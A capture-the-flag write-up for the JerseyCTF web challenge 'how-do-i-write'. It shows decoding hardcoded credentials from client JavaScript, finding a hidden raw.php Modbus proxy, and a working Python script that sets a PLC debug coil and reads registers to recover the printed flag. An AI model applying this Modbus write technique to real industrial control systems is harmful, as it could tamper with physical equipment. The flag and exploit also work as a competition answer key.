# How Do I Write — JerseyCTF Writeup

**Challenge:** how-do-i-write  
**Category:** web  
**Difficulty:** Hard  
**Points:** 998  
**Solves:** 14  
**Challenge Author:** Noah Jacobson  
**Writeup by:** zham  
**Flag:** `jctf{VQsLCvjzdo2W8Rq0-9MDzvkvUmlI88qPSNf3XvhGcORI3qhL-zv9oSlQIJ17dxyXaD}`

---

## Description

> We're trying to collect some debug information from our ventilation systems. Unfortunately the company that made them has since gone out of business. All we have is this old copy of a service manual. Are you able to get us the information we need?
>
> **NOTE:** Due to our method of sandboxing, a new instance of this challenge is spawned for every TCP connection. Make sure your payload uses a persistent connection.

**Attachment:** `Manual.pdf`

---

## Background Knowledge (Read This First!)

### What is Modbus?

**Modbus** is a serial communication protocol used in industrial control systems (ICS). Modbus TCP wraps the protocol over standard TCP/IP and operates on port 502 by default.

Key concepts:
- **Coils** — single-bit read/write registers (like on/off switches)
- **Input Registers** — 16-bit read-only registers
- **Holding Registers** — 16-bit read/write registers
- **Function codes** — e.g. `0x05` = write single coil, `0x04` = read input registers

### What is a Debug Bit?

The service manual describes a **Debug Bit** at coil address `00062`. When set to `1`, the system replaces normal system messages in the input registers with **debug/diagnostic information** — which contains the flag.

> *"The end user web panel and api.php endpoints do not have the ability to toggle this bit."*

This means we need to find another way to write the coil directly.

### What is raw.php?

The web dashboard's JavaScript file (`hvac.js`) reveals a hidden endpoint — `raw.php` — that accepts **raw Modbus TCP bytes** via HTTP POST and forwards them directly to the PLC, bypassing all web-layer restrictions.

---

## Solution — Step by Step

### Step 1 — Port Scan

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ nmap -sV how-do-i-write.aws.jerseyctf.com
Starting Nmap 7.98
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66 ((Debian))
```

Port 502 (standard Modbus) is not open externally. The service is proxied through HTTP.

### Step 2 — Find Credentials in login.js

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ curl http://how-do-i-write.aws.jerseyctf.com/login.js
```

The JavaScript compares `btoa(username+":"+password)` against a hardcoded list of Base64 strings. Decoding them:

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ echo "b3BlcmF0b3IxOnBhc3N3b3Jk" | base64 -d
operator1:password

┌──(zham㉿kali)-[/media/sf_downloads]
└─$ echo "b3BlcmF0b3IyOnBhc3N3b3Jk" | base64 -d
operator2:password
```

### Step 3 — Discover raw.php in hvac.js

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ curl http://how-do-i-write.aws.jerseyctf.com/hvac.js
```

Inside `hvac.js`, the function `p()` builds raw Modbus TCP frames and POSTs them to `raw.php` with `Content-Type: application/octet-stream`. The function `f(t, e)` calls `s(t, 61, 1, e)` — write coil 61 (zero-indexed; coil 62 in the manual) to ON.

### Step 4 — Memory Map from the Manual

| Address | Type | Description |
|---|---|---|
| `00062` | Coil | Debug Bit |
| `30031–30050` | Input Registers | System Messages (2 bytes per register) |

### Step 5 — Write the Exploit

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ nano exploit.py
```

```python
import requests
import struct

URL = "http://how-do-i-write.aws.jerseyctf.com/raw.php"
HEADERS = {"Content-Type": "application/octet-stream"}

session = requests.Session()  # persistent connection required!

def modbus_request(unit, func, addr, value):
    pdu = bytes([func]) + struct.pack(">HH", addr, value)
    mbap = b"\x00\x01\x00\x00" + struct.pack(">H", len(pdu) + 1) + bytes([unit])
    return mbap + pdu

def send(unit, func, addr, value):
    payload = modbus_request(unit, func, addr, value)
    r = session.post(URL, data=payload, headers=HEADERS)
    return r.content

# Enable debug coil (func 0x05, addr 61, value 0xFF00 = ON) on both units
send(1, 0x05, 61, 0xFF00)
send(2, 0x05, 61, 0xFF00)

# Read input registers (func 0x04, addr 30, count 40)
for unit in [1, 2]:
    print(f"\n--- Unit {unit} ---")
    resp = send(unit, 0x04, 30, 40)
    flag = ""
    for i in range(0, len(resp), 2):
        if i + 1 < len(resp):
            high = resp[i]
            low  = resp[i + 1]
            if 32 <= high < 127: flag += chr(high)
            if 32 <= low  < 127: flag += chr(low)
    print(f"Decoded: {flag}")
```

Save and exit nano:
- Press **Ctrl+O** to save
- Press **Enter** to confirm
- Press **Ctrl+X** to exit

### Step 6 — Run the Script

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ python3 exploit.py

--- Unit 1 ---
Decoded: P1: jctf{VQsLCvjzdo2W8Rq0-9MDzvkvUmlI88q

--- Unit 2 ---
Decoded: P2: PSNf3XvhGcORI3qhL-zv9oSlQIJ17dxyXaD}
```

Concatenating P1 + P2 gives the full flag.

---

## Flag

```
jctf{VQsLCvjzdo2W8Rq0-9MDzvkvUmlI88qPSNf3XvhGcORI3qhL-zv9oSlQIJ17dxyXaD}
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| `nmap` | Port scan to identify open services | ⭐ Easy |
| `curl` | Fetch login.js and hvac.js source | ⭐ Easy |
| `base64 -d` | Decode hardcoded credentials | ⭐ Easy |
| `python3 + requests` | Send raw Modbus TCP frames to raw.php | ⭐⭐ Medium |

---

## Key Takeaways

- **Read the manual.** The debug bit and register map were fully documented — the challenge was about finding the undocumented way to toggle it.
- **JavaScript source always reveals secrets.** `hvac.js` exposed `raw.php` — a direct Modbus proxy bypassing all web-layer restrictions.
- **The flag was split across two RTU units.** Always check all available units, not just unit 1.
- **Persistent connections matter.** Each TCP connection spawned a new instance — `requests.Session()` kept the connection alive across write and read operations.
